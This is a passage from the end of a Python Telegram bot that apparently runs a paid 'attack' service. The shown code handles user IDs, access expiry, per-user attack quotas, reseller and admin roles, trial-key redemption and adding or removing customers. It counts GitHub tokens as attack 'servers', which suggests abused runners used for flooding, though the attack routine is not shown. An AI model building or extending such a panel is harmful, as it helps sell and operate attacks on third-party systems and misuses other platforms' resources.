        await progress.edit_text(f"❌ {to_small_caps('ERROR')}\n\n{str(e)}")

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "None"
    
    text = f"╔════════════════════╗\n"
    text += f"║  {to_small_caps('YOUR ID INFO')}  ║\n"
    text += f"╚════════════════════╝\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('ACCOUNT INFO')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 🆔 {to_small_caps('User ID')}: `{user_id}`\n"
    text += f"├ 👤 {to_small_caps('Username')}: @{username}\n"
    text += f"└ 👤 {to_small_caps('Name')}: {update.effective_user.first_name}\n\n"
    text += f"💡 {to_small_caps('Send this ID to admin')}"
    
    await update.message.reply_text(text, parse_mode='Markdown')

async def myaccess_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id):
        role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "⚡ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💎 ʀᴇsᴇʟʟᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_approved_user(user_id):
        role = "✨ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        exp = user_data.get('expiry', 0)
        if exp == "LIFETIME":
            expiry = "ʟɪғᴇᴛɪᴍᴇ"
        else:
            days_left = int((exp - time.time()) / 86400)
            hours_left = int(((exp - time.time()) % 86400) / 3600)
            expiry = f"{days_left}ᴅ {hours_left}ʜ"
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ"
    
    remaining = MAX_ATTACKS - user_attack_counts.get(str(user_id), 0)
    status = "🟢 ᴀᴄᴛɪᴠᴇ" if can_user_attack(user_id) else "🔴 ɪɴᴀᴄᴛɪᴠᴇ"
    
    text = f"╔════════════════════════╗\n"
    text += f"║  {to_small_caps('YOUR ACCESS INFO')}  ║\n"
    text += f"╚════════════════════════╝\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('ACCOUNT DETAILS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"├ 👤 {to_small_caps('Role')}: {role}\n"
    text += f"├ 👤 {to_small_caps('Name')}: {update.effective_user.first_name}\n"
    text += f"├ 👤 {to_small_caps('Username')}: @{update.effective_user.username or 'None'}\n"
    text += f"├ 📅 {to_small_caps('Expiry')}: {expiry}\n"
    text += f"├ 🎯 {to_small_caps('Attacks')}: {remaining}/{MAX_ATTACKS}\n"
    text += f"└ ✅ {to_small_caps('Status')}: {status}"
    
    await update.message.reply_text(text)

async def add_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /add <id> <days>")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
        
        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(target_id)]
        save_json('pending_users.json', pending_users)
        
        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 86400)
        
        approved_users[str(target_id)] = {
            "username": f"user_{target_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_json('approved_users.json', approved_users)
        
        try:
            msg = f"╔════════════════════════╗\n"
            msg += f"║  {to_small_caps('ACCESS APPROVED')}  ║\n"
            msg += f"╚════════════════════════╝\n\n"
            msg += f"🎉 {to_small_caps('Access granted for')} {days} {to_small_caps('days')}\n"
            msg += f"💡 {to_small_caps('Use')} /start {to_small_caps('to begin')}"
            await context.bot.send_message(chat_id=target_id, text=msg)
        except:
            pass
        
        text = f"╔════════════════════╗\n"
        text += f"║  {to_small_caps('USER ADDED')}  ║\n"
        text += f"╚════════════════════╝\n\n"
        text += f"✅ {to_small_caps('Successfully added')}\n"
        text += f"├ 🆔 {to_small_caps('ID')}: {target_id}\n"
        text += f"└ ⏱️ {to_small_caps('Days')}: {days}"
        
        await update.message.reply_text(text)
    except:
        await update.message.reply_text(f"❌ {to_small_caps('Invalid format')}")

async def remove_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"❌ {to_small_caps('Access denied')}")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /remove <id>")
        return
    
    try:
        target_id = str(context.args[0])
        
        if target_id in approved_users:
            del approved_users[target_id]
            save_json('approved_users.json', approved_users)
            
            text = f"╔════════════════════╗\n"
            text += f"║  {to_small_caps('USER REMOVED')}  ║\n"
            text += f"╚════════════════════╝\n\n"
            text += f"✅ {to_small_caps('Successfully removed')}\n"
            text += f"└ 🆔 {to_small_caps('ID')}: {target_id}"
            
            await update.message.reply_text(text)
        else:
            await update.message.reply_text(f"❌ {to_small_caps('User not found')}")
    except:
        await update.message.reply_text(f"❌ {to_small_caps('Error occurred')}")

async def redeem_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(f"❌ {to_small_caps('Usage')}: /redeem <key>")
        return
    
    key = context.args[0].upper()
    success, message = redeem_trial_key(key, user_id)
    
    if success:
        text = f"╔════════════════════════╗\n"
        text += f"║  {to_small_caps('TRIAL ACTIVATED')}  ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"✅ {message}\n\n"
        text += f"💡 {to_small_caps('Use')} /start {to_small_caps('to begin')}"
        await update.message.reply_text(text)
    else:
        text = f"╔════════════════════╗\n"
        text += f"║  {to_small_caps('REDEMPTION FAILED')}  ║\n"
        text += f"╚════════════════════╝\n\n"
        text += f"❌ {message}"
        await update.message.reply_text(text)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    text = f"╔═══════════════════════╗\n"
    text += f"║  {to_small_caps('HELP & COMMANDS')}  ║\n"
    text += f"╚═══════════════════════╝\n\n"
    
    text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
    text += f"┃  {to_small_caps('BASIC COMMANDS')}  ┃\n"
    text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
    text += f"/start - {to_small_caps('Main menu')}\n"
    text += f"/id - {to_small_caps('Get your ID')}\n"
    text += f"/myaccess - {to_small_caps('Check access')}\n"
    text += f"/help - {to_small_caps('Show help')}\n"
    text += f"/redeem <key> - {to_small_caps('Redeem trial')}\n\n"
    
    if is_owner(user_id) or is_admin(user_id):
        text += f"┏━━━━━━━━━━━━━━━━━━━┓\n"
        text += f"┃  {to_small_caps('ADMIN COMMANDS')}  ┃\n"
        text += f"┗━━━━━━━━━━━━━━━━━━━┛\n"
        text += f"/add <id> <days> - {to_small_caps('Add user')}\n"
        text += f"/remove <id> - {to_small_caps('Remove user')}\n\n"
    
    text += f"💡 {to_small_caps('Use buttons for more features')}"
    
    await update.message.reply_text(text)

def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("id", id_cmd))
    application.add_handler(CommandHandler("myaccess", myaccess_cmd))
    application.add_handler(CommandHandler("add", add_cmd))
    application.add_handler(CommandHandler("remove", remove_cmd))
    application.add_handler(CommandHandler("redeem", redeem_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("╔════════════════════════════╗")
    print(f"║  {to_small_caps('BOT IS RUNNING')}...  ║")
    print("╚════════════════════════════╝")
    print(f"👑 {to_small_caps('Owners')}: {len(owners)}")
    print(f"⚡ {to_small_caps('Admins')}: {len(admins)}")
    print(f"📊 {to_small_caps('Users')}: {len(approved_users)}")
    print(f"💎 {to_small_caps('Resellers')}: {len(resellers)}")
    print(f"🔑 {to_small_caps('Servers')}: {len(github_tokens)}")
    print(f"🔧 {to_small_caps('Maintenance')}: {'🔴 ON' if MAINTENANCE_MODE else '🟢 OFF'}")
    print(f"⏳ {to_small_caps('Cooldown')}: {COOLDOWN_DURATION}s")
    print(f"🎯 {to_small_caps('Max attacks')}: {MAX_ATTACKS}")
    
    application.run_polling()

if __name__ == '__main__':
    main()
